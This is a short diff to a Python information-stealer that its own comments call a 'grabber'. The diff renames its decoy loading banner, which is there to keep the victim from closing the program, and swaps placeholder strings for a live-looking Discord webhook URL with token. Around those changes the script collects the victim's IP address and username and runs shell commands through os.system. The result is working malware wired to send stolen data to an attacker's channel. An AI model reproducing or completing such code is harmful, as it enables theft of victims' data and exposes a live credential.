@@ -52,7 +52,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-dummy_message = Fore.MAGENTA + "Loading NEOWARE..." # A message that distracts the user from closing the grabber
+dummy_message = Fore.MAGENTA + "Loading ZYROWARE..." # A message that distracts the user from closing the grabber
 print(dummy_message)
         
 #################### ADDING SHI #################
@@ -67,7 +67,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-send_webhook = "your shitty webhook"
+send_webhook = "https://discord.com/api/webhooks/1350699830976053289/JOvAGUNRZEtuOX7mNyClKWOiDkpdsiURNan4RkrPmbdPcSMKIkDtG7UqDbM0kAQ6DbhR"
 
 def command(c):
     os.system(c)
@@ -225,7 +225,7 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
+WEBHOOK_URL = "https://discord.com/api/webhooks/1350699830976053289/JOvAGUNRZEtuOX7mNyClKWOiDkpdsiURNan4RkrPmbdPcSMKIkDtG7UqDbM0kAQ6DbhR" #WEBHOOK URL GOES INSIDE THE QOUTES!
 webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
